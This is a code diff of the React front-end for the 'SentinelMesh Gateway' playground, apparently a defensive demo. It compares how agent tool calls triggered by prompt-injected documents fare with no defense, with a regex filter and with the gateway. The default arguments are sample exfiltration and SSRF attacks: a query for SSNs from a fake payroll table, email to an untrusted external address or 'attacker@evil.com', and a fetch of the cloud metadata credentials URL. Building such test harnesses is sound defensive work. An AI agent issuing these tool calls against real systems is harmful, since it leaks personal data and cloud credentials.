@@ -29,6 +29,13 @@ export interface StepTraceItem {
   detail: string;
 }
 
+export interface GatewayFinding {
+  name: string;
+  severity: string;
+  evidence: string;
+  owasp_category: string;
+}
+
 export interface LaneResult {
   name: string;
   decision: string;
@@ -38,6 +45,11 @@ export interface LaneResult {
   risk_score?: number;
   matched_phrases?: string[];
   layer_verdicts?: Record<string, string>;
+  latency_ms?: number;
+  risk_breakdown?: Record<string, any>;
+  findings?: GatewayFinding[];
+  sandbox_output?: any;
+  deobfuscated_preview?: string;
 }
 
 export interface PlaygroundRunResponse {
@@ -54,6 +66,104 @@ export interface PlaygroundRunResponse {
   is_bypass: boolean;
   summary: string;
 }
+
+const DEFAULT_ARGS_BY_TOOL: Record<string, Record<string, any>> = {
+  db_query: { query: 'SELECT name, salary, ssn FROM fake_payroll' },
+  send_email: {
+    to: 'external@untrusted.com',
+    subject: 'Data Export',
+    body: 'Forwarding sensitive summary...',
+  },
+  external_api: {
+    url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+    method: 'GET',
+  },
+  read_doc: { file_path: 'poisoned_resume.pdf.txt' },
+};
+
+function safeParseArgs(raw: string): Record<string, any> {
+  try {
+    const parsed = JSON.parse(raw);
+    return parsed && typeof parsed === 'object' && !Array.isArray(parsed) ? parsed : {};
+  } catch {
+    return {};
+  }
+}
+
+interface StepTraceToggleProps {
+  laneKey: string;
+  steps: StepTraceItem[];
+  expandedTraceLane: string | null;
+  onToggle: (k: string) => void;
+  statusHighlightClass?: string;
+}
+
+const StepTraceToggle: React.FC<StepTraceToggleProps> = ({
+  laneKey,
+  steps,
+  expandedTraceLane,
+  onToggle,
+  statusHighlightClass = 'text-cyan-300',
+}) => {
+  const isOpen = expandedTraceLane === laneKey;
+  return (
+    <div>
+      <button
+        type="button"
+        onClick={() => onToggle(laneKey)}
+        className="text-xs font-mono text-cyan-400 hover:text-cyan-300 flex items-center justify-between w-full pt-3 border-t border-white/10"
+      >
+        <span>Inspect Step Trace ({steps.length} steps)</span>
+        <span>{isOpen ? '▲' : '▼'}</span>
+      </button>
+
+      {isOpen && (
+        <div className="mt-3 space-y-2 pt-2 border-t border-white/5 animate-in fade-in duration-200">
+          {steps.map((st) => (
+            <div key={st.step} className="text-[11px] font-mono p-2 rounded bg-white/[0.02]">
+              <div className="text-slate-200 font-semibold">
+                #{st.step} {st.action} — <span className={statusHighlightClass}>{st.status}</span>
+              </div>
+              <div className="text-slate-400 text-[10px] mt-0.5">{st.detail}</div>
+            </div>
+          ))}
+        </div>
+      )}
+    </div>
+  );
+};
+
+interface SandboxOutputBoxProps {
+  output: any;
+  halted?: boolean;
+  label: string;
+}
+
+const SandboxOutputBox: React.FC<SandboxOutputBoxProps> = ({ output, halted = false, label }) => {
+  if (output === undefined || output === null) return null;
+  return (
+    <div
+      className={`mb-3 rounded-xl border p-2.5 ${
+        halted
+          ? 'bg-emerald-500/10 border-emerald-500/30'
+          : 'bg-black/50 border-rose-500/25'
+      }`}
+      data-testid={halted ? 'sandbox-output-halted' : 'sandbox-output-escaped'}
+    >
+      <div
+        className={`text-[10px] font-mono font-bold uppercase tracking-wider mb-1.5 flex items-center justify-between ${
+          halted ? 'text-emerald-300' : 'text-rose-300'
+        }`}
+      >
+        <span>{label}</span>
+        <span>{halted ? '0 BYTES ESCAPED' : 'LIVE SANDBOX OUTPUT'}</span>
+      </div>
+      <pre className="text-[10px] font-mono text-slate-200 whitespace-pre-wrap break-all max-h-32 overflow-y-auto leading-relaxed">
+        {typeof output === 'string' ? output : JSON.stringify(output, null, 2)}
+      </pre>
+    </div>
+  );
+};
 
 export const CANONICAL_PRESETS: PresetItem[] = [
   {
@@ -325,11 +435,32 @@ export const PlaygroundSection: React.FC = () => {
   const [runSeq, setRunSeq] = useState<number>(0);
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
   const [expandedTraceLane, setExpandedTraceLane] = useState<string | null>(null);
+  const [jsonMode, setJsonMode] = useState<boolean>(false);
+  const [sandboxStats, setSandboxStats] = useState<{
+    total_attempts: number;
+    total_bypasses: number;
+  } | null>(null);
   const resultsRef = useRef<HTMLDivElement | null>(null);
 
-  // 1. Fetch presets from backend API or static fallback
+  const fetchSandboxStats = useCallback(async () => {
+    try {
+      const res = await fetch('/api/v1/playground/findings');
+      if (res.ok) {
+        const data = await res.json();
+        setSandboxStats({
+          total_attempts: Number(data.total_attempts ?? 0),
+          total_bypasses: Number(data.total_bypasses ?? 0),
+        });
+      }
+    } catch {
+      // Offline / static fallback silently ignored
+    }
+  }, []);
+
+  // 1. Fetch presets & session stats from backend API or static fallback
   useEffect(() => {
     let isMounted = true;
+    fetchSandboxStats();
     const fetchPresets = async () => {
       try {
         const res = await fetch('/api/v1/playground/presets');
@@ -367,7 +498,7 @@ export const PlaygroundSection: React.FC = () => {
     return () => {
       isMounted = false;
     };
-  }, []);
+  }, [fetchSandboxStats]);
 
   const applyPreset = useCallback((p: PresetItem, shouldScroll = true) => {
     setSelectedPresetId(p.id);
@@ -408,6 +539,7 @@ export const PlaygroundSection: React.FC = () => {
       const data: PlaygroundRunResponse = await res.json();
       setRunResult(data);
       setRunSeq((s) => s + 1);
+      fetchSandboxStats();
       if (shouldScroll) {
         setTimeout(() => {
           resultsRef.current?.scrollIntoView({ behavior: 'smooth', block: 'start' });
@@ -432,6 +564,29 @@ export const PlaygroundSection: React.FC = () => {
     }
   };
 
+  const handleToolChange = (nextTool: string) => {
+    setTool(nextTool);
+    setSelectedPresetId('');
+    const cur = safeParseArgs(argsJson);
+    const primaryKeys: Record<string, string> = {
+      db_query: 'query',
+      send_email: 'to',
+      external_api: 'url',
+      read_doc: 'file_path',
+    };
+    const key = primaryKeys[nextTool];
+    if (key && cur[key] === undefined) {
+      setArgsJson(JSON.stringify(DEFAULT_ARGS_BY_TOOL[nextTool] || {}, null, 2));
+    }
+  };
+
+  const updateArgField = (field: string, value: string) => {
+    const cur = safeParseArgs(argsJson);
+    const next = { ...cur, [field]: value };
+    setArgsJson(JSON.stringify(next, null, 2));
+    setSelectedPresetId('');
+  };
+
   const handleManualRun = (e: React.FormEvent) => {
     e.preventDefault();
     let parsedArgs = {};
@@ -445,35 +600,55 @@ export const PlaygroundSection: React.FC = () => {
   };
 
   const activePreset = presets.find((p) => p.id === selectedPresetId);
+  const guidedArgs = safeParseArgs(argsJson);
 
   return (
     <div id="lab" className="w xs" data-testid="playground-section">
       {/* Section Header */}
-      <div className="eb mb-2 text-xs font-mono tracking-widest text-emerald-400 uppercase">
-        Interactive Gateway Sandbox
+      <div className="flex flex-wrap items-center justify-between gap-3 mb-2">
+        <div className="eb text-xs font-mono tracking-widest text-emerald-400 uppercase">
+          Interactive Gateway Sandbox
+        </div>
+        {sandboxStats && (
+          <div className="flex items-center gap-2 text-[11px] font-mono" data-testid="sandbox-session-stats">
+            <span className="px-2.5 py-1 rounded-lg bg-white/5 border border-white/10 text-slate-300">
+              Total Sandbox Attempts: <b className="text-cyan-300">{sandboxStats.total_attempts}</b>
+            </span>
+            <span
+              className={`px-2.5 py-1 rounded-lg border ${
+                sandboxStats.total_bypasses > 0
+                  ? 'bg-rose-500/15 border-rose-500/30 text-rose-300'
+                  : 'bg-emerald-500/10 border-emerald-500/30 text-emerald-300'
+              }`}
+            >
+              Recorded Bypasses: <b>{sandboxStats.total_bypasses}</b>
+            </span>
+          </div>
+        )}
       </div>
-      <h2 className="text-3xl sm:text-4xl lg:text-5xl font-extrabold text-white tracking-tight mb-4">
+
+      <h2 className="text-3xl sm:text-4xl lg:text-5xl font-extrabold text-white tracking-tight mb-3">
         Try to break it.
       </h2>
-      <p className="sub text-slate-300 text-sm sm:text-base max-w-3xl leading-relaxed mb-8">
-        Feed any adversarial document and tool action into the sandbox. Compare real execution
-        traces across three parallel lanes: <b>Pass-through</b> (no defense), <b>6-Phrase Filter</b>{' '}
-        (static regex baseline), and the <b>SentinelMesh Gateway</b> (deterministic defense-in-depth).
+      <p className="sub text-slate-300 text-sm sm:text-base max-w-3xl leading-relaxed mb-6">
+        Execute untrusted documents and real sandboxed tool actions side-by-side across three live
+        pipelines: <b>Pass-through</b> (no defense), <b>6-Phrase Filter</b> (regex baseline), and
+        the <b>SentinelMesh Gateway</b> (taint tracking, deobfuscation, SQL AST, and SSRF checks).
       </p>
 
-        {/* Preset Selector Buttons */}
-        <div id="sws" className="mb-8" data-testid="presets-container">
-          <div className="flex items-center justify-between mb-3">
+        {/* Compact 2-Row Preset Selector Strip */}
+        <div id="sws" className="mb-6" data-testid="presets-container">
+          <div className="flex items-center justify-between mb-2">
             <span className="text-xs font-mono uppercase tracking-wider text-slate-400 font-semibold">
               Select an Attack / Utility Preset ({presets.length} Scenarios):
             </span>
             {selectedPresetId && (
-              <span className="text-xs font-mono text-emerald-400">
-                Preset active: {activePreset?.title}
+              <span className="text-xs font-mono text-emerald-400 truncate max-w-md">
+                Active: {activePreset?.title}
               </span>
             )}
           </div>
-          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-2.5">
+          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-2">
             {presets.map((p) => {
               const isSelected = selectedPresetId === p.id;
               return (
@@ -481,17 +656,17 @@ export const PlaygroundSection: React.FC = () => {
                   key={p.id}
                   type="button"
                   onClick={() => applyPreset(p)}
-                  className={`p-3 rounded-xl border text-left transition-all ${
+                  className={`px-2.5 py-2 rounded-lg border text-left transition-all ${
                     isSelected
-                      ? 'bg-emerald-500/15 border-emerald-500/50 text-white shadow-lg shadow-emerald-500/10'
+                      ? 'bg-emerald-500/15 border-emerald-500/50 text-white shadow-md shadow-emerald-500/10'
                       : 'bg-white/[0.03] border-white/10 text-slate-300 hover:bg-white/[0.07] hover:border-white/20'
                   }`}
                   id={`preset-btn-${p.id}`}
                   data-testid={`preset-btn-${p.id}`}
                 >
-                  <div className="flex items-center justify-between gap-1 mb-1">
+                  <div className="flex items-center justify-between gap-1 mb-0.5">
                     <span
-                      className={`text-[10px] font-mono font-bold uppercase tracking-wider px-1.5 py-0.5 rounded ${
+                      className={`text-[9px] font-mono font-bold uppercase tracking-wider px-1.5 py-0.5 rounded ${
                         p.is_attack
                           ? 'bg-rose-500/20 text-rose-300 border border-rose-500/30'
                           : 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30'
@@ -499,12 +674,10 @@ export const PlaygroundSection: React.FC = () => {
                     >
                       {p.badge}
                     </span>
+                    <span className="text-[10px] text-slate-500 font-mono">{p.action.tool}</span>
                   </div>
                   <div className="text-xs font-semibold truncate text-white" title={p.title}>
                     {p.title}
-                  </div>
-                  <div className="text-[11px] text-slate-400 font-mono mt-0.5">
-                    Tool: {p.action.tool}
                   </div>
                 </button>
               );
@@ -513,9 +686,9 @@ export const PlaygroundSection: React.FC = () => {
         </div>
 
         {/* Interactive Editor Form */}
-        <div className="card p-6 rounded-2xl bg-[#0B0F1A]/90 border border-white/15 shadow-2xl backdrop-blur-xl mb-10">
+        <div className="card p-5 rounded-2xl bg-[#0B0F1A]/90 border border-white/15 shadow-2xl backdrop-blur-xl mb-8">
           <form onSubmit={handleManualRun}>
-            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
+            <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
               {/* Document Text Area (7 cols) */}
               <div className="lg:col-span-7 space-y-2">
                 <div className="flex items-center justify-between">
@@ -534,19 +707,29 @@ export const PlaygroundSection: React.FC = () => {
                     setDocumentText(e.target.value);
                     setSelectedPresetId('');
                   }}
-                  placeholder="Enter resume text, third-party email, API return, or prompt injection payload..."
+                  placeholder="Enter resume text, third-party email, Base64/homoglyph obfuscated payload, or SQL override..."
                   className="w-full bg-black/40 border border-white/15 rounded-xl p-3 text-xs font-mono text-slate-200 placeholder:text-slate-600 focus:outline-none focus:border-cyan-400/80 transition-all resize-y"
                   data-testid="playground-document-input"
                 />
               </div>
 
               {/* Action Specification (5 cols) */}
-              <div className="lg:col-span-5 space-y-3">
+              <div className="lg:col-span-5 space-y-2.5">
                 <div className="flex items-center justify-between">
                   <label htmlFor="tool-select" className="text-xs font-mono uppercase tracking-wider text-slate-300 font-semibold">
-                    2. Agent Action & Mock Tool
+                    2. Agent Action & Sandbox Tool
                   </label>
-                  <span className="text-[11px] font-mono text-emerald-400">Sandbox DB</span>
+                  <div className="flex items-center gap-2">
+                    <span className="text-[10px] font-mono text-emerald-400">Read-Only Sandbox</span>
+                    <button
+                      type="button"
+                      onClick={() => setJsonMode((m) => !m)}
+                      className="text-[10px] font-mono px-2 py-0.5 rounded bg-white/10 hover:bg-white/15 text-cyan-300 border border-white/15"
+                      data-testid="toggle-json-mode-btn"
+                    >
+                      {jsonMode ? 'Guided View' : 'Raw JSON'}
+                    </button>
+                  </div>
                 </div>
 
                 <div className="grid grid-cols-2 gap-2">
@@ -555,10 +738,7 @@ export const PlaygroundSection: React.FC = () => {
                     <select
                       id="tool-select"
                       value={tool}
-                      onChange={(e) => {
-                        setTool(e.target.value);
-                        setSelectedPresetId('');
-                      }}
+                      onChange={(e) => handleToolChange(e.target.value)}
                       className="w-full bg-black/40 border border-white/15 rounded-lg px-2.5 py-1.5 text-xs font-mono text-white focus:outline-none focus:border-cyan-400"
                       data-testid="playground-tool-select"
                     >
@@ -569,29 +749,115 @@ export const PlaygroundSection: React.FC = () => {
                     </select>
                   </div>
                   <div>
-                    <label className="text-[10px] font-mono text-slate-400 block mb-1">Target Resource:</label>
+                    <label className="text-[10px] font-mono text-slate-400 block mb-1">Sandbox Target:</label>
                     <div className="text-xs font-mono text-slate-300 py-1.5 px-2 rounded bg-white/5 border border-white/10 truncate">
-                      {tool === 'db_query' && 'fake_payroll DB'}
-                      {tool === 'send_email' && 'Mock Email Egress'}
-                      {tool === 'external_api' && 'Mock Outbound HTTP'}
+                      {tool === 'db_query' && 'fake_payroll / SQLite RO'}
+                      {tool === 'send_email' && 'Simulated SMTP Sink'}
+                      {tool === 'external_api' && 'Simulated Outbound HTTP'}
                       {tool === 'read_doc' && 'Synthetic Document'}
                     </div>
                   </div>
                 </div>
 
+                {!jsonMode && (
+                  <div className="space-y-2">
+                    {tool === 'db_query' && (
+                      <div>
+                        <label className="text-[10px] font-mono text-slate-400 block mb-1">SQL Query:</label>
+                        <input
+                          type="text"
+                          value={String(guidedArgs.query ?? guidedArgs.sql ?? '')}
+                          onChange={(e) => updateArgField('query', e.target.value)}
+                          className="w-full bg-black/40 border border-white/15 rounded-lg px-2.5 py-1.5 text-[11px] font-mono text-slate-200 focus:outline-none focus:border-cyan-400"
+                          placeholder="SELECT name, salary, ssn FROM fake_payroll"
+                        />
+                      </div>
+                    )}
+                    {tool === 'send_email' && (
+                      <div className="space-y-1.5">
+                        <div className="grid grid-cols-2 gap-2">
+                          <input
+                            type="text"
+                            value={String(guidedArgs.to ?? guidedArgs.recipient ?? '')}
+                            onChange={(e) => updateArgField('to', e.target.value)}
+                            placeholder="To (e.g. attacker@evil.com)"
+                            className="bg-black/40 border border-white/15 rounded-lg px-2 py-1 text-[11px] font-mono text-slate-200 focus:outline-none focus:border-cyan-400"
+                          />
+                          <input
+                            type="text"
+                            value={String(guidedArgs.subject ?? '')}
+                            onChange={(e) => updateArgField('subject', e.target.value)}
+                            placeholder="Subject"
+                            className="bg-black/40 border border-white/15 rounded-lg px-2 py-1 text-[11px] font-mono text-slate-200 focus:outline-none focus:border-cyan-400"
+                          />
+                        </div>
+                        <input
+                          type="text"
+                          value={String(guidedArgs.body ?? '')}
+                          onChange={(e) => updateArgField('body', e.target.value)}
+                          placeholder="Email body payload"
+                          className="w-full bg-black/40 border border-white/15 rounded-lg px-2 py-1 text-[11px] font-mono text-slate-200 focus:outline-none focus:border-cyan-400"
+                        />
+                      </div>
+                    )}
+                    {tool === 'external_api' && (
+                      <div className="space-y-1.5">
+                        <div className="flex gap-2">
+                          <select
+                            value={String(guidedArgs.method ?? 'GET').toUpperCase()}
+                            onChange={(e) => updateArgField('method', e.target.value)}
+                            className="w-20 bg-black/40 border border-white/15 rounded-lg px-2 py-1 text-[11px] font-mono text-white focus:outline-none focus:border-cyan-400"
+                          >
+                            <option value="GET">GET</option>
+                            <option value="POST">POST</option>
+                          </select>
+                          <input
+                            type="text"
+                            value={String(guidedArgs.url ?? guidedArgs.endpoint ?? '')}
+                            onChange={(e) => updateArgField('url', e.target.value)}
+                            placeholder="Target URL (e.g. http://169.254.169.254/...)"
+                            className="flex-1 bg-black/40 border border-white/15 rounded-lg px-2 py-1 text-[11px] font-mono text-slate-200 focus:outline-none focus:border-cyan-400"
+                          />
+                        </div>
+                        {guidedArgs.body !== undefined && (
+                          <input
+                            type="text"
+                            value={String(guidedArgs.body)}
+                            onChange={(e) => updateArgField('body', e.target.value)}
+                            placeholder="POST Body"
+                            className="w-full bg-black/40 border border-white/15 rounded-lg px-2 py-1 text-[11px] font-mono text-slate-200 focus:outline-none focus:border-cyan-400"
+                          />
+                        )}
+                      </div>
+                    )}
+                    {tool === 'read_doc' && (
+                      <div>
+                        <label className="text-[10px] font-mono text-slate-400 block mb-1">File Path:</label>
+                        <input
+                          type="text"
+                          value={String(guidedArgs.file_path ?? guidedArgs.path ?? '')}
+                          onChange={(e) => updateArgField('file_path', e.target.value)}
+                          placeholder="poisoned_resume.pdf.txt"
+                          className="w-full bg-black/40 border border-white/15 rounded-lg px-2.5 py-1.5 text-[11px] font-mono text-slate-200 focus:outline-none focus:border-cyan-400"
+                        />
+                      </div>
+                    )}
+                  </div>
+                )}
+
                 <div>
                   <label htmlFor="args-input" className="text-[10px] font-mono text-slate-400 block mb-1">
-                    Arguments (JSON):
+                    {jsonMode ? 'Raw Arguments (JSON):' : 'Synced Payload JSON:'}
                   </label>
                   <textarea
                     id="args-input"
-                    rows={3}
+                    rows={jsonMode ? 5 : 2}
                     value={argsJson}
                     onChange={(e) => {
                       setArgsJson(e.target.value);
                       setSelectedPresetId('');
                     }}
-                    className="w-full bg-black/40 border border-white/15 rounded-lg p-2 text-[11px] font-mono text-slate-200 focus:outline-none focus:border-cyan-400 resize-none"
+                    className="w-full bg-black/40 border border-white/15 rounded-lg p-2 text-[11px] font-mono text-slate-300 focus:outline-none focus:border-cyan-400 resize-y"
                     data-testid="playground-args-input"
                   />
                 </div>
@@ -697,71 +963,65 @@ export const PlaygroundSection: React.FC = () => {
                 data-testid="lane-card-pass-through"
               >
                 <div>
-                  <div className="flex items-center justify-between mb-3">
+                  <div className="flex items-center justify-between mb-3 gap-2">
                     <span className="text-xs font-mono uppercase tracking-wider text-slate-400 font-bold">
                       Lane A: Pass-Through
                     </span>
-                    <span
-                      className={`text-[11px] font-mono uppercase font-bold px-2 py-0.5 rounded ${
-                        runResult.lanes.pass_through.decision === 'allow'
-                          ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'
-                          : 'bg-rose-500/20 text-rose-300 border border-rose-500/40'
-                      }`}
-                      data-testid="lane-decision-pass-through"
-                    >
-                      {runResult.lanes.pass_through.decision.toUpperCase()}
-                    </span>
+                    <div className="flex items-center gap-1.5">
+                      {runResult.lanes.pass_through.latency_ms !== undefined && (
+                        <span className="text-[10px] font-mono text-slate-400 px-1.5 py-0.5 rounded bg-white/5 border border-white/10">
+                          {runResult.lanes.pass_through.latency_ms.toFixed(1)} ms
+                        </span>
+                      )}
+                      <span
+                        className={`text-[11px] font-mono uppercase font-bold px-2 py-0.5 rounded ${
+                          runResult.lanes.pass_through.decision === 'allow'
+                            ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'
+                            : 'bg-rose-500/20 text-rose-300 border border-rose-500/40'
+                        }`}
+                        data-testid="lane-decision-pass-through"
+                      >
+                        {runResult.lanes.pass_through.decision.toUpperCase()}
+                      </span>
+                    </div>
                   </div>
 
                   <h3 className="text-base font-bold text-white mb-1">
                     {runResult.lanes.pass_through.name}
                   </h3>
-                  <p className="text-xs text-slate-400 mb-4">Baseline B0: Zero security checks</p>
+                  <p className="text-xs text-slate-400 mb-3">Baseline B0: Zero security checks</p>
 
                   {/* Exposure Banner */}
-                  <div className="p-3 rounded-xl bg-rose-500/10 border border-rose-500/20 mb-4">
+                  <div className="p-3 rounded-xl bg-rose-500/10 border border-rose-500/20 mb-3">
                     <div className="text-xs font-mono text-rose-300 font-bold">
                       {runResult.lanes.pass_through.records_exposed} records exposed
                     </div>
                     <p className="text-[11px] text-slate-400 mt-0.5">
                       {runResult.lanes.pass_through.records_exposed > 0
-                        ? 'Confidential records read and transmitted without impediment.'
-                        : 'Action permitted.'}
+                        ? 'Confidential records read/transmitted without barrier.'
+                        : 'Executed directly in sandbox.'}
                     </p>
                   </div>
 
+                  {/* Sandbox Output Preview */}
+                  <SandboxOutputBox
+                    output={runResult.lanes.pass_through.sandbox_output}
+                    halted={false}
+                    label="Sandbox Output (What Escaped)"
+                  />
+
                   {/* Reason Callout */}
-                  <div className="text-xs font-mono text-slate-300 p-3 rounded-xl bg-black/40 border border-white/10 mb-4">
+                  <div className="text-xs font-mono text-slate-300 p-2.5 rounded-xl bg-black/40 border border-white/10 mb-3">
                     {runResult.lanes.pass_through.reason}
                   </div>
                 </div>
 
-                {/* Step Trace Toggle */}
-                <div>
-                  <button
-                    type="button"
-                    onClick={() =>
-                      setExpandedTraceLane(expandedTraceLane === 'pass_through' ? null : 'pass_through')
-                    }
-                    className="text-xs font-mono text-cyan-400 hover:text-cyan-300 flex items-center justify-between w-full pt-3 border-t border-white/10"
-                  >
-                    <span>Inspect Step Trace ({runResult.lanes.pass_through.step_trace.length} steps)</span>
-                    <span>{expandedTraceLane === 'pass_through' ? '▲' : '▼'}</span>
-                  </button>
-
-                  {expandedTraceLane === 'pass_through' && (
-                    <div className="mt-3 space-y-2 pt-2 border-t border-white/5 animate-in fade-in duration-200">
-                      {runResult.lanes.pass_through.step_trace.map((st) => (
-                        <div key={st.step} className="text-[11px] font-mono p-2 rounded bg-white/[0.02]">
-                          <div className="text-slate-200 font-semibold">
-                            #{st.step} {st.action} — <span className="text-cyan-300">{st.status}</span>
-                          </div>
-                          <div className="text-slate-400 text-[10px] mt-0.5">{st.detail}</div>
-                        </div>
-                      ))}
-                    </div>
-                  )}
-                </div>
+                <StepTraceToggle
+                  laneKey="pass_through"
+                  steps={runResult.lanes.pass_through.step_trace}
+                  expandedTraceLane={expandedTraceLane}
+                  onToggle={(k) => setExpandedTraceLane(expandedTraceLane === k ? null : k)}
+                />
               </div>
 
               {/* Lane B: 6-Phrase Filter */}
@@ -770,30 +1030,37 @@ export const PlaygroundSection: React.FC = () => {
                 data-testid="lane-card-phrase-filter"
               >
                 <div>
-                  <div className="flex items-center justify-between mb-3">
+                  <div className="flex items-center justify-between mb-3 gap-2">
                     <span className="text-xs font-mono uppercase tracking-wider text-slate-400 font-bold">
                       Lane B: 6-Phrase Filter
                     </span>
-                    <span
-                      className={`text-[11px] font-mono uppercase font-bold px-2 py-0.5 rounded ${
-                        runResult.lanes.phrase_filter.decision === 'block'
-                          ? 'bg-rose-500/20 text-rose-300 border border-rose-500/40'
-                          : 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
-                      }`}
-                      data-testid="lane-decision-phrase-filter"
-                    >
-                      {runResult.lanes.phrase_filter.decision.toUpperCase()}
-                    </span>
+                    <div className="flex items-center gap-1.5">
+                      {runResult.lanes.phrase_filter.latency_ms !== undefined && (
+                        <span className="text-[10px] font-mono text-slate-400 px-1.5 py-0.5 rounded bg-white/5 border border-white/10">
+                          {runResult.lanes.phrase_filter.latency_ms.toFixed(1)} ms
+                        </span>
+                      )}
+                      <span
+                        className={`text-[11px] font-mono uppercase font-bold px-2 py-0.5 rounded ${
+                          runResult.lanes.phrase_filter.decision === 'block'
+                            ? 'bg-rose-500/20 text-rose-300 border border-rose-500/40'
+                            : 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
+                        }`}
+                        data-testid="lane-decision-phrase-filter"
+                      >
+                        {runResult.lanes.phrase_filter.decision.toUpperCase()}
+                      </span>
+                    </div>
                   </div>
 
                   <h3 className="text-base font-bold text-white mb-1">
                     {runResult.lanes.phrase_filter.name}
                   </h3>
-                  <p className="text-xs text-slate-400 mb-4">Baseline B2: Static regex matching only</p>
+                  <p className="text-xs text-slate-400 mb-3">Baseline B2: Static regex matching only</p>
 
                   {/* Exposure Banner */}
                   <div
-                    className={`p-3 rounded-xl border mb-4 ${
+                    className={`p-3 rounded-xl border mb-3 ${
                       runResult.lanes.phrase_filter.decision === 'block'
                         ? 'bg-emerald-500/10 border-emerald-500/20'
                         : 'bg-rose-500/10 border-rose-500/20'
@@ -811,9 +1078,18 @@ export const PlaygroundSection: React.FC = () => {
                     <p className="text-[11px] text-slate-400 mt-0.5">
                       {runResult.lanes.phrase_filter.decision === 'block'
                         ? 'Trigger phrase detected. Halted at string scan.'
-                        : 'Filter evaded by phrasing or syntax.'}
+                        : 'Filter evaded by phrasing, encoding, or tool syntax.'}
                     </p>
                   </div>
+
+                  {/* Sandbox Output Preview if Evaded */}
+                  {runResult.lanes.phrase_filter.decision === 'allow' && (
+                    <SandboxOutputBox
+                      output={runResult.lanes.phrase_filter.sandbox_output}
+                      halted={false}
+                      label="Sandbox Output (Filter Bypassed)"
+                    />
+                  )}
 
                   {/* Matched Phrases Chip if any */}
                   {runResult.lanes.phrase_filter.matched_phrases &&
@@ -836,37 +1112,17 @@ export const PlaygroundSection: React.FC = () => {
                     )}
 
                   {/* Reason Callout */}
-                  <div className="text-xs font-mono text-slate-300 p-3 rounded-xl bg-black/40 border border-white/10 mb-4">
+                  <div className="text-xs font-mono text-slate-300 p-2.5 rounded-xl bg-black/40 border border-white/10 mb-3">
                     {runResult.lanes.phrase_filter.reason}
                   </div>
                 </div>
 
-                {/* Step Trace Toggle */}
-                <div>
-                  <button
-                    type="button"
-                    onClick={() =>
-                      setExpandedTraceLane(expandedTraceLane === 'phrase_filter' ? null : 'phrase_filter')
-                    }
-                    className="text-xs font-mono text-cyan-400 hover:text-cyan-300 flex items-center justify-between w-full pt-3 border-t border-white/10"
-                  >
-                    <span>Inspect Step Trace ({runResult.lanes.phrase_filter.step_trace.length} steps)</span>
-                    <span>{expandedTraceLane === 'phrase_filter' ? '▲' : '▼'}</span>
-                  </button>
-
-                  {expandedTraceLane === 'phrase_filter' && (
-                    <div className="mt-3 space-y-2 pt-2 border-t border-white/5 animate-in fade-in duration-200">
-                      {runResult.lanes.phrase_filter.step_trace.map((st) => (
-                        <div key={st.step} className="text-[11px] font-mono p-2 rounded bg-white/[0.02]">
-                          <div className="text-slate-200 font-semibold">
-                            #{st.step} {st.action} — <span className="text-cyan-300">{st.status}</span>
-                          </div>
-                          <div className="text-slate-400 text-[10px] mt-0.5">{st.detail}</div>
-                        </div>
-                      ))}
-                    </div>
-                  )}
-                </div>
+                <StepTraceToggle
+                  laneKey="phrase_filter"
+                  steps={runResult.lanes.phrase_filter.step_trace}
+                  expandedTraceLane={expandedTraceLane}
+                  onToggle={(k) => setExpandedTraceLane(expandedTraceLane === k ? null : k)}
+                />
               </div>
 
               {/* Lane C: SentinelMesh Gateway */}
@@ -875,31 +1131,38 @@ export const PlaygroundSection: React.FC = () => {
                 data-testid="lane-card-gateway"
               >
                 <div>
-                  <div className="flex items-center justify-between mb-3">
+                  <div className="flex items-center justify-between mb-3 gap-2">
                     <span className="text-xs font-mono uppercase tracking-wider text-cyan-400 font-bold">
                       Lane C: SentinelMesh
                     </span>
-                    <span
-                      className={`text-[11px] font-mono uppercase font-bold px-2 py-0.5 rounded ${
-                        runResult.lanes.gateway.decision === 'allow'
-                          ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'
-                          : runResult.lanes.gateway.decision === 'require_approval' || runResult.lanes.gateway.decision === 'held'
-                          ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
-                          : 'bg-rose-500/20 text-rose-300 border border-rose-500/40'
-                      }`}
-                      data-testid="lane-decision-gateway"
-                    >
-                      {runResult.lanes.gateway.decision === 'require_approval'
-                        ? 'HELD (APPROVAL REQUIRED)'
-                        : runResult.lanes.gateway.decision.toUpperCase()}
-                    </span>
+                    <div className="flex items-center gap-1.5">
+                      {runResult.lanes.gateway.latency_ms !== undefined && (
+                        <span className="text-[10px] font-mono text-cyan-300 px-1.5 py-0.5 rounded bg-cyan-500/10 border border-cyan-500/25">
+                          {runResult.lanes.gateway.latency_ms.toFixed(1)} ms
+                        </span>
+                      )}
+                      <span
+                        className={`text-[11px] font-mono uppercase font-bold px-2 py-0.5 rounded ${
+                          runResult.lanes.gateway.decision === 'allow'
+                            ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'
+                            : runResult.lanes.gateway.decision === 'require_approval' || runResult.lanes.gateway.decision === 'held'
+                            ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
+                            : 'bg-rose-500/20 text-rose-300 border border-rose-500/40'
+                        }`}
+                        data-testid="lane-decision-gateway"
+                      >
+                        {runResult.lanes.gateway.decision === 'require_approval'
+                          ? 'HELD (APPROVAL REQUIRED)'
+                          : runResult.lanes.gateway.decision.toUpperCase()}
+                      </span>
+                    </div>
                   </div>
 
                   <h3 className="text-base font-bold text-white mb-1">
                     {runResult.lanes.gateway.name}
                   </h3>
-                  <div className="flex items-center justify-between text-xs text-slate-400 mb-4">
-                    <span>Defense-in-depth with provenance taint</span>
+                  <div className="flex items-center justify-between text-xs text-slate-400 mb-3">
+                    <span>Real GatewayCore evaluation</span>
                     {runResult.lanes.gateway.risk_score !== undefined && (
                       <span className="font-mono text-cyan-300 font-semibold">
                         Risk: {runResult.lanes.gateway.risk_score}/100
@@ -907,69 +1170,115 @@ export const PlaygroundSection: React.FC = () => {
                     )}
                   </div>
 
-                  {/* Zero Exposure Banner */}
